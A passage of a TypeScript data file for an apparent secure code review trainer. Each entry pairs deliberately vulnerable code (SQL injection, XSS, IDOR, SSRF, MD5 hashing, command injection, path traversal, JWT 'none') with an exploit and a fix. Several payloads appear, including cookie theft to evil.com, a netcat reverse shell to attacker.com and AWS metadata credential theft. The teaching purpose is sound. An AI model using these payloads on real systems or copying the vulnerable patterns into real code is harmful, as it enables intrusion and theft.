// Code Review Snippet Types and Sample Data

export interface CodeSnippet {
    id: string;
    title: string;
    description: string;
    language: 'javascript' | 'python' | 'php' | 'java' | 'sql' | 'go';
    category: 'sqli' | 'xss' | 'ssrf' | 'idor' | 'auth' | 'crypto' | 'injection';
    difficulty: 'easy' | 'medium' | 'hard';
    vulnerableCode: string;
    exploitedCode: string; // Vulnerable code with malicious payload injected
    secureCode: string;
    secureExploitedCode: string; // Secure code showing how it handles the same payload
    vulnerableLines: number[]; // Line numbers to highlight
    explanation: string;
    hints: string[];
    vulnerabilityType: string;
    severity: 'low' | 'medium' | 'high' | 'critical';
    cwe?: string; // CWE ID
    owasp?: string; // OWASP category
    exploitExample?: {
        title: string;
        description: string;
        payload: string;
        result: string;
    };
}

export const codeSnippets: CodeSnippet[] = [
    {
        id: 'sql-injection-login',
        title: 'SQL Injection in Login',
        description: 'A classic SQL injection vulnerability in a login function that allows attackers to bypass authentication.',
        language: 'python',
        category: 'sqli',
        difficulty: 'easy',
        vulnerableCode: `def login(username, password):
    # Connect to database
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    cursor.execute(query)
    
    user = cursor.fetchone()
    conn.close()
    
    if user:
        return {"success": True, "user": user}
    return {"success": False, "error": "Invalid credentials"}`,
        exploitedCode: `def login(username, password):
    # Connect to database
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # 🔴 EXPLOITED: Attacker input: username = "' OR '1'='1' --"
    # The query now becomes:
    query = f"SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything'"
    #                                                  ↑ Always TRUE    ↑ Rest is commented out
    cursor.execute(query)
    
    user = cursor.fetchone()  # ✓ Returns first user (usually admin!)
    conn.close()
    
    if user:
        return {"success": True, "user": user}  # ✓ Login bypassed!
    return {"success": False, "error": "Invalid credentials"}`,
        secureCode: `def login(username, password):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    cursor.execute(query, (username, password))
    
    user = cursor.fetchone()
    conn.close()
    
    if user:
        return {"success": True, "user": user}
    return {"success": False, "error": "Invalid credentials"}`,
        secureExploitedCode: `def login(username, password):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # ✅ SAFE: Same malicious input "' OR '1'='1' --"
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    cursor.execute(query, (username, password))
    # The ? placeholder treats input as DATA, not SQL code
    # Query executed: SELECT * FROM users WHERE username = "' OR '1'='1' --" AND password = "anything"
    #                                                       ↑ Searched as literal string, not SQL!
    
    user = cursor.fetchone()  # Returns None - no match found
    conn.close()
    
    if user:
        return {"success": True, "user": user}
    return {"success": False, "error": "Invalid credentials"}  # ✅ Attack blocked!`,
        vulnerableLines: [6, 7],
        explanation: 'This code is vulnerable to SQL injection because user input is directly concatenated into the SQL query. An attacker can input `\' OR \'1\'=\'1` as the username to bypass authentication entirely.',
        hints: [
            'Look at how user input is being used in the query',
            'What happens if the username contains a single quote?',
            'Research parameterized queries or prepared statements'
        ],
        vulnerabilityType: 'SQL Injection',
        severity: 'critical',
        cwe: 'CWE-89',
        owasp: 'A03:2021 - Injection',
        exploitExample: {
            title: 'Authentication Bypass',
            description: 'Attacker inputs a malicious username to bypass password check',
            payload: `Username: ' OR '1'='1' --
Password: anything`,
            result: `Query becomes:
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'anything'

✓ The OR '1'='1' always evaluates to true
✓ The -- comments out the rest of the query
✓ Returns first user in database (usually admin)`
        }
    },
    {
        id: 'xss-reflected',
        title: 'Reflected XSS in Search',
        description: 'User input is reflected back in the page without proper sanitization, allowing script injection.',
        language: 'javascript',
        category: 'xss',
        difficulty: 'easy',
        vulnerableCode: `app.get('/search', (req, res) => {
    const query = req.query.q;
    
    res.send(\`
        <html>
            <body>
                <h1>Search Results</h1>
                <p>You searched for: \${query}</p>
                <div id="results"></div>
            </body>
        </html>
    \`);
});`,
        exploitedCode: `app.get('/search', (req, res) => {
    // 🔴 EXPLOITED: Attacker sends: /search?q=<script>steal()</script>
    const query = req.query.q;  // = "<script>document.location='https://evil.com?c='+document.cookie</script>"
    
    // The HTML now includes executable JavaScript:
    res.send(\`
        <html>
            <body>
                <h1>Search Results</h1>
                <p>You searched for: <script>document.location='https://evil.com?c='+document.cookie</script></p>
                <!--            ↑ BROWSER EXECUTES THIS SCRIPT! -->
                <div id="results"></div>
            </body>
        </html>
    \`);
    // ✓ Victim's cookies sent to attacker's server
    // ✓ Session hijacked!
});`,
        secureCode: `const escapeHtml = require('escape-html');

app.get('/search', (req, res) => {
    const query = req.query.q;
    const safeQuery = escapeHtml(query);
    
    res.send(\`
        <html>
            <body>
                <h1>Search Results</h1>
                <p>You searched for: \${safeQuery}</p>
                <div id="results"></div>
            </body>
        </html>
    \`);
});`,
        secureExploitedCode: `const escapeHtml = require('escape-html');

app.get('/search', (req, res) => {
    // ✅ SAFE: Same malicious input "<script>steal()</script>"
    const query = req.query.q;
    const safeQuery = escapeHtml(query);
    // escapeHtml converts: <script> → &lt;script&gt;
    
    res.send(\`
        <html>
            <body>
                <h1>Search Results</h1>
                <p>You searched for: &lt;script&gt;steal()&lt;/script&gt;</p>
                <!-- ↑ Displayed as TEXT, not executed as script! -->
                <div id="results"></div>
            </body>
        </html>
    \`);
    // ✅ User sees literal text "<script>steal()</script>"
    // ✅ No code execution, attack blocked!
});`,
        vulnerableLines: [8],
        explanation: 'The search query is directly embedded into the HTML response without sanitization. An attacker can craft a URL like `/search?q=<script>alert("XSS")</script>` to execute arbitrary JavaScript in the victim\'s browser.',
        hints: [
            'What characters have special meaning in HTML?',
            'What if the query contains < or > characters?',
            'Look into HTML entity encoding'
        ],
        vulnerabilityType: 'Cross-Site Scripting (XSS)',
        severity: 'high',
        cwe: 'CWE-79',
        owasp: 'A03:2021 - Injection',
        exploitExample: {
            title: 'Script Injection via URL',
            description: 'Attacker crafts a malicious URL and tricks victim into clicking it',
            payload: `/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>`,
            result: `The page renders:
<p>You searched for: <script>document.location='https://evil.com/steal?c='+document.cookie</script></p>

✓ Script executes in victim's browser
✓ Cookies (including session) sent to attacker
✓ Attacker can hijack user session`
        }
    },
    {
        id: 'idor-user-profile',
        title: 'IDOR in User Profile',
        description: 'Direct object reference allows accessing other users\' profiles by changing the ID parameter.',
        language: 'javascript',
        category: 'idor',
        difficulty: 'medium',
        vulnerableCode: `app.get('/api/user/:id', async (req, res) => {
    const userId = req.params.id;
    
    const user = await User.findById(userId);
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    res.json({
        id: user.id,
        email: user.email,
        phone: user.phone,
        address: user.address,
        ssn: user.ssn
    });
});`,
        exploitedCode: `// 🔴 EXPLOITED: Attacker (user ID 5) requests /api/user/1
app.get('/api/user/:id', async (req, res) => {
    const userId = req.params.id;  // = "1" (admin's ID)
    
    // No check if requester is authorized!
    const user = await User.findById(userId);  // Returns admin's data
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    // ✓ Attacker receives OTHER user's sensitive data:
    res.json({
        id: user.id,           // "1"
        email: user.email,     // "admin@company.com"
        phone: user.phone,     // "555-0100"
        address: user.address, // "123 Secret St"
        ssn: user.ssn          // "123-45-6789" ← LEAKED!
    });
});`,
        secureCode: `app.get('/api/user/:id', authMiddleware, async (req, res) => {
    const userId = req.params.id;
    const currentUser = req.user;
    
    if (userId !== currentUser.id && !currentUser.isAdmin) {
        return res.status(403).json({ error: 'Unauthorized' });
    }
    
    const user = await User.findById(userId);
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    res.json({
        id: user.id,
        email: user.email,
        phone: userId === currentUser.id ? user.phone : undefined,
        address: userId === currentUser.id ? user.address : undefined
    });
});`,
        secureExploitedCode: `// ✅ SAFE: Attacker (user ID 5) tries to access /api/user/1
app.get('/api/user/:id', authMiddleware, async (req, res) => {
    const userId = req.params.id;  // "1" (trying to access admin)
    const currentUser = req.user;   // { id: "5", isAdmin: false }
    
    // Authorization check stops the attack
    if (userId !== currentUser.id && !currentUser.isAdmin) {
        return res.status(403).json({ error: 'Unauthorized' });
        // ✅ Returns 403 - request blocked here!
    }
    
    // This code never executes for unauthorized requests
    const user = await User.findById(userId);
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    res.json({ ... });
});
// ✅ Attacker receives: {"error": "Unauthorized"}
// ✅ Admin data protected!`,
        vulnerableLines: [4],
        explanation: 'The endpoint retrieves user data based solely on the ID parameter without verifying if the requesting user is authorized to access that data. An attacker can enumerate user IDs to access sensitive information of other users.',
        hints: [
            'Who should be able to access this data?',
            'Is there any authentication or authorization?',
            'What if someone changes the ID in the URL?'
        ],
        vulnerabilityType: 'Insecure Direct Object Reference',
        severity: 'high',
        cwe: 'CWE-639',
        owasp: 'A01:2021 - Broken Access Control',
        exploitExample: {
            title: 'User Data Enumeration',
            description: 'Attacker changes user ID to access other accounts',
            payload: `# Logged in as user ID 5
curl https://api.example.com/api/user/1
curl https://api.example.com/api/user/2
curl https://api.example.com/api/user/3`,
            result: `Response for /api/user/1:
{
  "id": 1,
  "email": "admin@example.com",
  "phone": "555-0100",
  "ssn": "123-45-6789"  ← Sensitive!
}

✓ Access to all user data without authorization
✓ Can dump entire user database`
        }
    },
    {
        id: 'ssrf-url-fetch',
        title: 'SSRF in URL Preview',
        description: 'Server-side request forgery through unvalidated URL fetching for link previews.',
        language: 'javascript',
        category: 'ssrf',
        difficulty: 'hard',
        vulnerableCode: `app.post('/api/preview', async (req, res) => {
    const { url } = req.body;
    
    try {
        const response = await fetch(url);
        const html = await response.text();
        
        const title = html.match(/<title>(.*?)<\\/title>/)?.[1];
        const desc = html.match(/meta name="description" content="(.*?)"/)?.[1];
        
        res.json({ title, description: desc });
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch URL' });
    }
});`,
        exploitedCode: `app.post('/api/preview', async (req, res) => {
    // 🔴 EXPLOITED: Attacker sends internal URL
    const { url } = req.body;  // = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    
    try {
        // Server makes request to AWS metadata endpoint!
        const response = await fetch(url);
        const html = await response.text();
        
        // Response contains AWS credentials:
        // {
        //   "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
        //   "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/...",
        //   "Token": "..."
        // }
        // ✓ Attacker now has cloud access!
        
        res.json({ title: html, description: '' });
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch URL' });
    }
});`,
        secureCode: `const { URL } = require('url');
const ALLOWED_PROTOCOLS = ['http:', 'https:'];
const BLOCKED_HOSTS = ['localhost', '127.0.0.1', '0.0.0.0', '169.254.169.254'];

app.post('/api/preview', async (req, res) => {
    const { url } = req.body;
    
    try {
        const parsedUrl = new URL(url);
        
        if (!ALLOWED_PROTOCOLS.includes(parsedUrl.protocol)) {
            return res.status(400).json({ error: 'Invalid protocol' });
        }
        
        if (BLOCKED_HOSTS.some(host => parsedUrl.hostname.includes(host))) {
            return res.status(400).json({ error: 'Blocked host' });
        }
        
        const response = await fetch(url, { timeout: 5000 });
        const html = await response.text();
        
        const title = html.match(/<title>(.*?)<\\/title>/)?.[1];
        res.json({ title });
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch URL' });
    }
});`,
        secureExploitedCode: `// ✅ SAFE: Same attack "http://169.254.169.254/latest/meta-data/..."
const { URL } = require('url');
const BLOCKED_HOSTS = ['localhost', '127.0.0.1', '169.254.169.254'];

app.post('/api/preview', async (req, res) => {
    const { url } = req.body;  // "http://169.254.169.254/..."
    
    try {
        const parsedUrl = new URL(url);
        // parsedUrl.hostname = "169.254.169.254"
        
        // Blocklist check catches the attack
        if (BLOCKED_HOSTS.some(host => parsedUrl.hostname.includes(host))) {
            return res.status(400).json({ error: 'Blocked host' });
            // ✅ Stops here! Returns 400 Bad Request
        }
        
        // This code never executes for blocked hosts
        const response = await fetch(url);
        // ...
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch URL' });
    }
});
// ✅ Attacker receives: {"error": "Blocked host"}
// ✅ AWS credentials protected!`,
        vulnerableLines: [5],
        explanation: 'The server fetches any URL provided by the user without validation. An attacker can use this to access internal services (e.g., http://localhost:8080/admin), cloud metadata endpoints (http://169.254.169.254), or scan internal networks.',
        hints: [
            'What URLs should be allowed?',
            'Can the user make the server access internal resources?',
            'What about cloud metadata endpoints?'
        ],
        vulnerabilityType: 'Server-Side Request Forgery',
        severity: 'critical',
        cwe: 'CWE-918',
        owasp: 'A10:2021 - SSRF',
        exploitExample: {
            title: 'AWS Metadata Endpoint Access',
            description: 'Attacker uses SSRF to steal cloud credentials',
            payload: `POST /api/preview
{
  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}`,
            result: `Response reveals AWS role name, then:

POST /api/preview
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole"}

{
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/...",
  "Token": "..."
}

✓ Full AWS credentials exposed
✓ Attacker can access S3, EC2, etc.`
        }
    },
    {
        id: 'weak-password-hash',
        title: 'Weak Password Hashing',
        description: 'Using MD5 for password hashing provides inadequate security against modern attacks.',
        language: 'python',
        category: 'crypto',
        difficulty: 'easy',
        vulnerableCode: `import hashlib

def register_user(username, password):
    password_hash = hashlib.md5(password.encode()).hexdigest()
    
    db.users.insert_one({
        'username': username,
        'password': password_hash
    })
    return True

def verify_password(username, password):
    user = db.users.find_one({'username': username})
    if not user:
        return False
    
    input_hash = hashlib.md5(password.encode()).hexdigest()
    return input_hash == user['password']`,
        exploitedCode: `# 🔴 EXPLOITED: Attacker gets database dump
# Database contains:
# { "username": "admin", "password": "5f4dcc3b5aa765d61d8327deb882cf99" }
# { "username": "alice", "password": "5f4dcc3b5aa765d61d8327deb882cf99" }  # Same hash!
# { "username": "bob",   "password": "e99a18c428cb38d5f260853678922e03" }

# Attacker uses hashcat or rainbow table:
# $ hashcat -m 0 hashes.txt rockyou.txt

# Results (in seconds):
# 5f4dcc3b5aa765d61d8327deb882cf99 = "password"  ← admin & alice use same password!
# e99a18c428cb38d5f260853678922e03 = "abc123"

# ✓ MD5 computes at ~25 BILLION hashes/second on GPU
# ✓ No salt = identical passwords have identical hashes
# ✓ All common passwords cracked in minutes`,
        secureCode: `import bcrypt

def register_user(username, password):
    password_bytes = password.encode('utf-8')
    salt = bcrypt.gensalt(rounds=12)
    password_hash = bcrypt.hashpw(password_bytes, salt)
    
    db.users.insert_one({
        'username': username,
        'password': password_hash.decode('utf-8')
    })
    return True

def verify_password(username, password):
    user = db.users.find_one({'username': username})
    if not user:
        return False
    
    password_bytes = password.encode('utf-8')
    stored_hash = user['password'].encode('utf-8')
    return bcrypt.checkpw(password_bytes, stored_hash)`,
        secureExploitedCode: `import bcrypt

# ✅ SAFE: Same attack - attacker gets database dump
# Database now contains bcrypt hashes:
# { "username": "admin", "password": "$2b$12$LQv3c1y..." }
# { "username": "alice", "password": "$2b$12$9KxW7vZ..." }  # Different hash!

def register_user(username, password):
    password_bytes = password.encode('utf-8')
    salt = bcrypt.gensalt(rounds=12)  # Unique salt per user
    password_hash = bcrypt.hashpw(password_bytes, salt)
    # Even "password" → "$2b$12$randomsalt...uniquehash"
    
    db.users.insert_one({
        'username': username,
        'password': password_hash.decode('utf-8')
    })
    return True

def verify_password(username, password):
    user = db.users.find_one({'username': username})
    if not user:
        return False
    
    # bcrypt internally extracts salt from stored hash
    password_bytes = password.encode('utf-8')
    stored_hash = user['password'].encode('utf-8')
    return bcrypt.checkpw(password_bytes, stored_hash)

# Attacker tries: hashcat -m 3200 bcrypt_hashes.txt rockyou.txt
# ✅ bcrypt: ~10-20 hashes/sec (vs 25 BILLION for MD5)
# ✅ Years to crack even common passwords`,
        vulnerableLines: [4],
        explanation: 'MD5 is a fast hashing algorithm, making it vulnerable to brute-force and rainbow table attacks. It also lacks salting, meaning identical passwords produce identical hashes. Modern password hashing requires slow algorithms like bcrypt, scrypt, or Argon2 with unique salts.',
        hints: [
            'How fast can MD5 hashes be computed?',
            'What is a rainbow table attack?',
            'Why is salting important for password storage?'
        ],
        vulnerabilityType: 'Weak Cryptography',
        severity: 'high',
        cwe: 'CWE-328',
        owasp: 'A02:2021 - Cryptographic Failures',
        exploitExample: {
            title: 'Rainbow Table Attack',
            description: 'Attacker uses precomputed hashes to crack passwords',
            payload: `# Password hash from leaked database:
5f4dcc3b5aa765d61d8327deb882cf99

# Lookup in rainbow table:
hashcat -m 0 -a 0 hash.txt rockyou.txt`,
            result: `5f4dcc3b5aa765d61d8327deb882cf99:password

✓ MD5 hash cracked in < 1 second
✓ "password" is a common password
✓ No salt = identical passwords have same hash
✓ Entire database can be cracked quickly`
        }
    },
    {
        id: 'command-injection-ping',
        title: 'OS Command Injection',
        description: 'User input is passed directly to system commands without sanitization.',
        language: 'python',
        category: 'injection',
        difficulty: 'medium',
        vulnerableCode: `import subprocess

def ping_host(host):
    cmd = f"ping -c 4 {host}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout`,
        exploitedCode: `import subprocess

def ping_host(host):
    # 🔴 EXPLOITED: Attacker input: host = "8.8.8.8; cat /etc/passwd"
    cmd = f"ping -c 4 8.8.8.8; cat /etc/passwd"
    #                         ↑ Command separator - runs second command!
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    # ✓ Returns: ping output + contents of /etc/passwd!
    return result.stdout`,
        secureCode: `import subprocess
import shlex

def ping_host(host):
    if not host.replace('.', '').isalnum():
        raise ValueError("Invalid hostname")
    
    result = subprocess.run(
        ["ping", "-c", "4", host],
        capture_output=True,
        text=True
    )
    return result.stdout`,
        secureExploitedCode: `import subprocess

def ping_host(host):
    # ✅ SAFE: Same attack "8.8.8.8; cat /etc/passwd"
    if not host.replace('.', '').isalnum():
        raise ValueError("Invalid hostname")
        # ✅ Raises error - semicolon is not alphanumeric!
    
    # Even if it passed, using list instead of string:
    result = subprocess.run(
        ["ping", "-c", "4", host],  # No shell=True, no command parsing
        capture_output=True,
        text=True
    )
    return result.stdout
    # ✅ Attack blocked at validation step!`,
        vulnerableLines: [4, 5],
        explanation: 'The user input is directly interpolated into a shell command. Using shell=True allows command chaining with ; | && etc. An attacker can inject additional commands to read files, spawn shells, or compromise the server.',
        hints: [
            'What does shell=True do in subprocess?',
            'Can special characters change command behavior?',
            'How can you run commands without shell interpretation?'
        ],
        vulnerabilityType: 'OS Command Injection',
        severity: 'critical',
        cwe: 'CWE-78',
        owasp: 'A03:2021 - Injection',
        exploitExample: {
            title: 'Command Chaining',
            description: 'Attacker uses shell metacharacters to execute arbitrary commands',
            payload: `Host: 8.8.8.8; cat /etc/passwd
Host: 8.8.8.8 && whoami
Host: 8.8.8.8 | nc attacker.com 4444 -e /bin/sh`,
            result: `Command becomes:
ping -c 4 8.8.8.8; cat /etc/passwd

✓ First command pings 8.8.8.8
✓ Second command reads /etc/passwd
✓ Attacker can read any file or run any command`
        }
    },
    {
        id: 'path-traversal-download',
        title: 'Path Traversal in File Download',
        description: 'File path from user input allows directory traversal to access unauthorized files.',
        language: 'javascript',
        category: 'injection',
        difficulty: 'easy',
        vulnerableCode: `const express = require('express');
const path = require('path');

app.get('/download', (req, res) => {
    const filename = req.query.file;
    const filepath = path.join('/var/app/uploads', filename);
    res.download(filepath);
});`,
        exploitedCode: `const express = require('express');
const path = require('path');

app.get('/download', (req, res) => {
    // 🔴 EXPLOITED: Attacker requests ?file=../../../etc/passwd
    const filename = req.query.file;  // "../../../etc/passwd"
    const filepath = path.join('/var/app/uploads', '../../../etc/passwd');
    // filepath = "/etc/passwd"
    res.download(filepath);
    // ✓ Attacker downloads system password file!
});`,
        secureCode: `const express = require('express');
const path = require('path');

app.get('/download', (req, res) => {
    const filename = req.query.file;
    const uploadsDir = '/var/app/uploads';
    const filepath = path.join(uploadsDir, filename);
    
    if (!filepath.startsWith(uploadsDir)) {
        return res.status(403).json({ error: 'Access denied' });
    }
    
    res.download(filepath);
});`,
        secureExploitedCode: `const express = require('express');
const path = require('path');

app.get('/download', (req, res) => {
    // ✅ SAFE: Same attack "../../../etc/passwd"
    const filename = req.query.file;  // "../../../etc/passwd"
    const uploadsDir = '/var/app/uploads';
    const filepath = path.join(uploadsDir, filename);
    // filepath = "/etc/passwd" (path.join resolves ..)
    
    // Security check
    if (!filepath.startsWith(uploadsDir)) {
        return res.status(403).json({ error: 'Access denied' });
        // ✅ "/etc/passwd" doesn't start with "/var/app/uploads"
        // ✅ Returns 403 Forbidden!
    }
    
    res.download(filepath);  // Never reached
});`,
        vulnerableLines: [6],
        explanation: 'The filename from user input is used directly in file operations. An attacker can use ../ sequences to traverse outside the intended directory and access sensitive system files like /etc/passwd, configuration files, or source code.',
        hints: [
            'What does ../ mean in file paths?',
            'How can you ensure the file is within allowed directories?',
            'What sensitive files exist on Linux/Windows systems?'
        ],
        vulnerabilityType: 'Path Traversal',
        severity: 'high',
        cwe: 'CWE-22',
        owasp: 'A01:2021 - Broken Access Control',
        exploitExample: {
            title: 'Directory Traversal Attack',
            description: 'Attacker uses ../ to escape the uploads directory',
            payload: `GET /download?file=../../../etc/passwd
GET /download?file=....//....//etc/passwd
GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd`,
            result: `Resolved path: /etc/passwd

File contents returned:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...

✓ Attacker can read any file on server`
        }
    },
    {
        id: 'jwt-none-algorithm',
        title: 'JWT None Algorithm Attack',
        description: 'JWT verification accepts "none" algorithm, allowing tokens to be forged.',
        language: 'javascript',
        category: 'auth',
        difficulty: 'hard',
        vulnerableCode: `const jwt = require('jsonwebtoken');

function verifyToken(token) {
    const decoded = jwt.decode(token, { complete: true });
    const algorithm = decoded.header.alg;
    
    return jwt.verify(token, secret, { algorithms: [algorithm] });
}`,
        exploitedCode: `const jwt = require('jsonwebtoken');

function verifyToken(token) {
    // 🔴 EXPLOITED: Attacker sends JWT with alg: "none"
    // Token: header.payload.  (empty signature)
    // Header: {"alg":"none","typ":"JWT"}
    // Payload: {"userId":"admin","role":"admin"}
    
    const decoded = jwt.decode(token, { complete: true });
    const algorithm = decoded.header.alg;  // "none"
    
    return jwt.verify(token, secret, { algorithms: [algorithm] });
    // ✓ Accepts algorithm from attacker's token!
    // ✓ "none" means no signature verification!
    // ✓ Attacker is now admin!
}`,
        secureCode: `const jwt = require('jsonwebtoken');

const ALLOWED_ALGORITHMS = ['HS256', 'HS384', 'HS512'];

function verifyToken(token) {
    return jwt.verify(token, secret, { 
        algorithms: ALLOWED_ALGORITHMS 
    });
}`,
        secureExploitedCode: `const jwt = require('jsonwebtoken');

const ALLOWED_ALGORITHMS = ['HS256', 'HS384', 'HS512'];

function verifyToken(token) {
    // ✅ SAFE: Same attack with alg: "none"
    // Attacker's token has {"alg":"none"} in header
    
    return jwt.verify(token, secret, { 
        algorithms: ALLOWED_ALGORITHMS  // Only HS256, HS384, HS512
    });
    // ✅ "none" not in allowed list
    // ✅ Throws: JsonWebTokenError: invalid algorithm
    // ✅ Forged token rejected!
}`,
        vulnerableLines: [5, 7],
        explanation: 'The application trusts the algorithm specified in the JWT header. An attacker can change the algorithm to "none" and remove the signature, creating a valid-looking token that bypasses verification entirely.',
        hints: [
            'Should the algorithm come from the token itself?',
            'What is the "none" algorithm in JWT?',
            'How do you whitelist allowed algorithms?'
        ],
        vulnerabilityType: 'Broken Authentication',
        severity: 'critical',
        cwe: 'CWE-327',
        owasp: 'A07:2021 - Identification Failures',
        exploitExample: {
            title: 'Algorithm None Attack',
            description: 'Attacker modifies JWT header to bypass signature verification',
            payload: `Original token:
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjV9.signature

Forged token (alg: none):
eyJhbGciOiJub25lIn0.eyJ1c2VySWQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.`,
            result: `Decoded forged token:
Header: {"alg":"none"}
Payload: {"userId":"admin","role":"admin"}
Signature: (empty)

✓ No signature to verify
✓ Server accepts attacker as admin
✓ Complete authentication bypass`
        }
    },
    {
        id: 'sqli-order-by',
        title: 'SQL Injection in ORDER BY',
        description: 'Dynamic column sorting vulnerable to SQL injection through ORDER BY clause.',
        language: 'python',
        category: 'sqli',
        difficulty: 'medium',
        vulnerableCode: `def get_products(sort_by='name'):
    query = f"SELECT * FROM products ORDER BY {sort_by}"
    cursor.execute(query)
    return cursor.fetchall()`,
        exploitedCode: `def get_products(sort_by='name'):
    # 🔴 EXPLOITED: Attacker sends sort_by = "(CASE WHEN (1=1) THEN name ELSE price END)"
    # Or for data extraction: "name; SELECT password FROM users--"
    query = f"SELECT * FROM products ORDER BY (CASE WHEN (SELECT password FROM users WHERE username='admin') LIKE 'a%' THEN name ELSE price END)"
    cursor.execute(query)
    # ✓ Response timing/ordering reveals password character by character!
    return cursor.fetchall()`,
        secureCode: `ALLOWED_COLUMNS = ['name', 'price', 'created_at', 'stock']

def get_products(sort_by='name'):
    if sort_by not in ALLOWED_COLUMNS:
        sort_by = 'name'
    
    query = f"SELECT * FROM products ORDER BY {sort_by}"
    cursor.execute(query)
    return cursor.fetchall()`,
        secureExploitedCode: `ALLOWED_COLUMNS = ['name', 'price', 'created_at', 'stock']

def get_products(sort_by='name'):
    # ✅ SAFE: Attacker sends malicious sort_by
    # sort_by = "(CASE WHEN...)"
    
    if sort_by not in ALLOWED_COLUMNS:
        sort_by = 'name'  # ✅ Falls back to safe default
    
    query = f"SELECT * FROM products ORDER BY name"
    cursor.execute(query)
    return cursor.fetchall()
    # ✅ Attack blocked by whitelist!`,
        vulnerableLines: [2],
        explanation: 'ORDER BY clauses cannot use parameterized queries for column names. Whitelisting allowed column names is the only safe approach.',
        hints: [
            'Can ORDER BY use parameterized queries?',
            'What values should be allowed for sorting?',
            'How can CASE statements extract data?'
        ],
        vulnerabilityType: 'SQL Injection',
        severity: 'high',
        cwe: 'CWE-89',
        owasp: 'A03:2021 - Injection',
        exploitExample: {
            title: 'Boolean-based Blind SQLi',
            description: 'Attacker extracts data by observing result ordering',
            payload: `sort_by=(CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' THEN name ELSE price END)`,
            result: `If password starts with 'a': sorted by name
If not: sorted by price

✓ Attacker iterates through characters
✓ Extracts full password from ordering behavior`
        }
    },
    {
        id: 'sqli-second-order',
        title: 'Second-Order SQL Injection',
        description: 'Stored input is later used unsafely in a different query context.',
        language: 'python',
        category: 'sqli',
        difficulty: 'hard',
        vulnerableCode: `def register(username, password):
    # Input is safely parameterized here
    cursor.execute(
        "INSERT INTO users (username, password) VALUES (?, ?)",
        (username, password)
    )

def change_password(username, new_password):
    # But username from DB is used unsafely later!
    cursor.execute(
        f"UPDATE users SET password = '{new_password}' WHERE username = '{username}'"
    )`,
        exploitedCode: `def register(username, password):
    # 🔴 STEP 1: Attacker registers with username: admin'--
    cursor.execute(
        "INSERT INTO users (username, password) VALUES (?, ?)",
        ("admin'--", "anything")  # Stored safely in DB
    )

def change_password(username, new_password):
    # 🔴 STEP 2: Later, when "admin'--" changes password:
    cursor.execute(
        f"UPDATE users SET password = 'hacked123' WHERE username = 'admin'--'"
        #                                                        ↑ Closes admin's WHERE
        #                                                             ↑ Comments out rest
    )
    # ✓ Admin's password is now "hacked123"!`,
        secureCode: `def register(username, password):
    cursor.execute(
        "INSERT INTO users (username, password) VALUES (?, ?)",
        (username, password)
    )

def change_password(username, new_password):
    cursor.execute(
        "UPDATE users SET password = ? WHERE username = ?",
        (new_password, username)
    )`,
        secureExploitedCode: `def register(username, password):
    # ✅ SAFE: Same attack - username = "admin'--"
    cursor.execute(
        "INSERT INTO users (username, password) VALUES (?, ?)",
        ("admin'--", "anything")  # Stored in DB
    )

def change_password(username, new_password):
    # ✅ Parameterized query treats username as DATA
    cursor.execute(
        "UPDATE users SET password = ? WHERE username = ?",
        ("newpass", "admin'--")
        #           ↑ Searched as literal string "admin'--"
    )
    # ✅ Only updates the user literally named "admin'--"
    # ✅ Real admin account is safe!`,
        vulnerableLines: [10, 11],
        explanation: 'Second-order SQL injection occurs when malicious input is stored safely but later retrieved and used unsafely. Always use parameterized queries even for data that "should be safe" from your own database.',
        hints: [
            'Is data from your own database always safe?',
            'What if a username contains SQL characters?',
            'Trace where stored data is used later'
        ],
        vulnerabilityType: 'SQL Injection',
        severity: 'critical',
        cwe: 'CWE-89',
        owasp: 'A03:2021 - Injection',
        exploitExample: {
            title: 'Account Takeover via Stored Payload',
            description: 'Attacker registers with malicious username to later compromise admin',
            payload: `Step 1: Register as "admin'--"
Step 2: Request password change
Step 3: Query becomes: UPDATE users SET password='x' WHERE username='admin'--'`,
            result: `✓ Stored payload activates in different context
✓ Admin password changed to attacker's choice
✓ Full admin account takeover`
        }
    },
    {
        id: 'xss-stored',
        title: 'Stored XSS in Comments',
        description: 'User comments are stored and displayed to all users without sanitization.',
        language: 'javascript',
        category: 'xss',
        difficulty: 'medium',
        vulnerableCode: `app.post('/api/comments', async (req, res) => {
    const { postId, content } = req.body;
    await db.comments.insert({ postId, content, userId: req.user.id });
    res.json({ success: true });
});

app.get('/post/:id', async (req, res) => {
    const post = await db.posts.findById(req.params.id);
    const comments = await db.comments.find({ postId: req.params.id });
    
    let html = \`<h1>\${post.title}</h1>\`;
    comments.forEach(c => {
        html += \`<div class="comment">\${c.content}</div>\`;
    });
    res.send(html);
});`,
